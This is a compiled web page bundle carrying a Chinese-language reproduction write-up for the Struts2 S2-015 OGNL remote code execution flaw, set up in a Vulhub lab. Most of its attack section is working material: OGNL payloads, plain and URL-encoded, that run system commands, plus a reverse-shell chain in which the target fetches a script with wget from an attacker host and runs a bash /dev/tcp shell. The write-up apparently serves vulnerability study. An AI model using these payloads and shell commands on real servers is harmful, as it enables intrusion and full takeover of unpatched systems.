import{_ as s}from"./plugin-vue_export-helper-c27b6911.js";import{r as d,o as c,c as i,a as e,b as l,d as n,e as t}from"./app-58e4a7d6.js";const r={},o=t(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>漏洞产生于配置了 Action 通配符 *，并将其作为动态值时，解析时会将其内容执行 OGNL 表达式，例如：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&lt;package name=&quot;S2-015&quot; extends=&quot;struts-default&quot;&gt;
    &lt;action name=&quot;*&quot; class=&quot;com.demo.action.PageAction&quot;&gt;
        &lt;result&gt;/{1}.jsp&lt;/result&gt;
    &lt;/action&gt;
&lt;/package&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>上述配置能让我们访问 name.action 时使用 name.jsp 来渲染页面，但是在提取 name 并解析时，对其执行了 OGNL 表达式解析，所以导致命令执行。在实践复现的时候发现，由于 name 值的位置比较特殊，一些特殊的字符如 / &quot; \\ 都无法使用（转义也不行），所以在利用该点进行远程命令执行时一些带有路径的命令可能无法执行成功。</p><p>还有需要说明的就是在 Struts 2.3.14.1 - Struts 2.3.14.2 的更新内容中，删除了 SecurityMemberAccess 类中的 setAllowStaticMethodAccess 方法，因此在 2.3.14.2 版本以后都不能直接通过 <code>#_memberAccess[&#39;allowStaticMethodAccess&#39;]=true</code> 来修改其值达到重获静态方法调用的能力。</p><p>漏洞详情:</p>`,6),u={href:"http://struts.apache.org/docs/s2-015.html",target:"_blank",rel:"noopener noreferrer"},m=t(`<h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><p>影响版本: 2.0.0 - 2.3.14.2</p><h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub执行以下命令启动s2-015测试环境：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose build
docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>访问<code>http://your-vps-ip:8080/index.html</code>即可进入上传表单页面。</p><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>这里为了到达执行命令的目的可以用 kxlzx 提到的调用动态方法 (new java.lang.ProcessBuilder(&#39;calc&#39;)).start() 来解决，另外还可以借助 Java 反射机制去间接修改：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>#context[&#39;xwork.MethodAccessor.denyMethodExecution&#39;]=false,#m=#_memberAccess.getClass().getDeclaredField(&#39;allowStaticMethodAccess&#39;),#m.setAccessible(true),#m.set(#_memberAccess,true)
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>可以构造 Payload 如下：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>\${#context[&#39;xwork.MethodAccessor.denyMethodExecution&#39;]=false,#m=#_memberAccess.getClass().getDeclaredField(&#39;allowStaticMethodAccess&#39;),#m.setAccessible(true),#m.set(#_memberAccess,true),#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;id&#39;).getInputStream()),#q}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>进行URL编码后的Payload：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>GET /S2-015/%24%7b%23%63%6f%6e%74%65%78%74%5b%27%78%77%6f%72%6b%2e%4d%65%74%68%6f%64%41%63%63%65%73%73%6f%72%2e%64%65%6e%79%4d%65%74%68%6f%64%45%78%65%63%75%74%69%6f%6e%27%5d%3d%66%61%6c%73%65%2c%23%6d%3d%23%5f%6d%65%6d%62%65%72%41%63%63%65%73%73%2e%67%65%74%43%6c%61%73%73%28%29%2e%67%65%74%44%65%63%6c%61%72%65%64%46%69%65%6c%64%28%27%61%6c%6c%6f%77%53%74%61%74%69%63%4d%65%74%68%6f%64%41%63%63%65%73%73%27%29%2c%23%6d%2e%73%65%74%41%63%63%65%73%73%69%62%6c%65%28%74%72%75%65%29%2c%23%6d%2e%73%65%74%28%23%5f%6d%65%6d%62%65%72%41%63%63%65%73%73%2c%74%72%75%65%29%2c%23%71%3d%40%6f%72%67%2e%61%70%61%63%68%65%2e%63%6f%6d%6d%6f%6e%73%2e%69%6f%2e%49%4f%55%74%69%6c%73%40%74%6f%53%74%72%69%6e%67%28%40%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%40%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%27%69%64%27%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%29%2c%23%71%7d.action HTTP/1.1
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>直接回显：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203011852988.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>除了上面所说到的这种情况以外，S2-015 还涉及一种二次引用执行的情况：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&lt;action name=&quot;param&quot; class=&quot;com.demo.action.ParamAction&quot;&gt;
    &lt;result name=&quot;success&quot; type=&quot;httpheader&quot;&gt;
        &lt;param name=&quot;error&quot;&gt;305&lt;/param&gt;
        &lt;param name=&quot;headers.fxxk&quot;&gt;\${message}&lt;/param&gt;
    &lt;/result&gt;
&lt;/action&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>这里配置了 <code>&lt;param name=&quot;errorMessage&quot;&gt;\${message}&lt;/param&gt;</code>，其中 message 为 ParamAction 中的一个私有变量，这样配置会导致触发该 Result 时，Struts2 会从请求参数中获取 message 的值，并在解析过程中，触发了 OGNL 表达式执行，因此只用提交 %{1111*2} 作为其变量值提交就会得到执行。这里需要注意的是这里的二次解析是因为在 struts.xml 中使用 \${param} 引用了 Action 中的变量所导致的，并不针对于 type=&quot;httpheader&quot; 这种返回方式。</p><p>可以构造 Payload 如下：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>%{#context[&#39;xwork.MethodAccessor.denyMethodExecution&#39;]=false,#m=#_memberAccess.getClass().getDeclaredField(&#39;allowStaticMethodAccess&#39;),#m.setAccessible(true),#m.set(#_memberAccess,true),#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;id&#39;).getInputStream()),#q}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>进行URL编码后的Payload（最开始的%24变为%25）：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>GET /param.action?message=%25%7b%23%63%6f%6e%74%65%78%74%5b%27%78%77%6f%72%6b%2e%4d%65%74%68%6f%64%41%63%63%65%73%73%6f%72%2e%64%65%6e%79%4d%65%74%68%6f%64%45%78%65%63%75%74%69%6f%6e%27%5d%3d%66%61%6c%73%65%2c%23%6d%3d%23%5f%6d%65%6d%62%65%72%41%63%63%65%73%73%2e%67%65%74%43%6c%61%73%73%28%29%2e%67%65%74%44%65%63%6c%61%72%65%64%46%69%65%6c%64%28%27%61%6c%6c%6f%77%53%74%61%74%69%63%4d%65%74%68%6f%64%41%63%63%65%73%73%27%29%2c%23%6d%2e%73%65%74%41%63%63%65%73%73%69%62%6c%65%28%74%72%75%65%29%2c%23%6d%2e%73%65%74%28%23%5f%6d%65%6d%62%65%72%41%63%63%65%73%73%2c%74%72%75%65%29%2c%23%71%3d%40%6f%72%67%2e%61%70%61%63%68%65%2e%63%6f%6d%6d%6f%6e%73%2e%69%6f%2e%49%4f%55%74%69%6c%73%40%74%6f%53%74%72%69%6e%67%28%40%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%40%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%27%69%64%27%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%29%2c%23%71%7d HTTP/1.
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h3 id="反弹shell" tabindex="-1"><a class="header-anchor" href="#反弹shell" aria-hidden="true">#</a> 反弹shell</h3><p>通过第二种方式获取反弹shell，注意要进行URL编码。</p><p>编写shell脚本并启动http服务器：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>echo &quot;bash -i &gt;&amp; /dev/tcp/192.168.174.128/9999 0&gt;&amp;1&quot; &gt; shell.sh
python3环境下：python -m http.server 80
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>上传shell.sh文件的命令为：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>wget 192.168.174.128/shell.sh
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>上传shell.sh文件的Payload为：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>%{#context[&#39;xwork.MethodAccessor.denyMethodExecution&#39;]=false,#m=#_memberAccess.getClass().getDeclaredField(&#39;allowStaticMethodAccess&#39;),#m.setAccessible(true),#m.set(#_memberAccess,true),#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;wget 192.168.174.128/shell.sh&#39;).getInputStream()),#q}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>执行shell.sh文件的命令为：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>bash /usr/local/tomcat/shell.sh
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>执行shell.sh文件的Payload为：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>%{#context[&#39;xwork.MethodAccessor.denyMethodExecution&#39;]=false,#m=#_memberAccess.getClass().getDeclaredField(&#39;allowStaticMethodAccess&#39;),#m.setAccessible(true),#m.set(#_memberAccess,true),#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;bash /usr/local/tomcat/shell.sh&#39;).getInputStream()),#q}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>成功接收反弹shell：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203011900116.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,36);function p(g,h){const a=d("ExternalLinkIcon");return c(),i("div",null,[o,e("ul",null,[e("li",null,[e("a",u,[l("http://struts.apache.org/docs/s2-015.html"),n(a)])])]),m])}const x=s(r,[["render",p],["__file","Struts2 S2-015 远程代码执行漏洞.html.vue"]]);export{x as default};
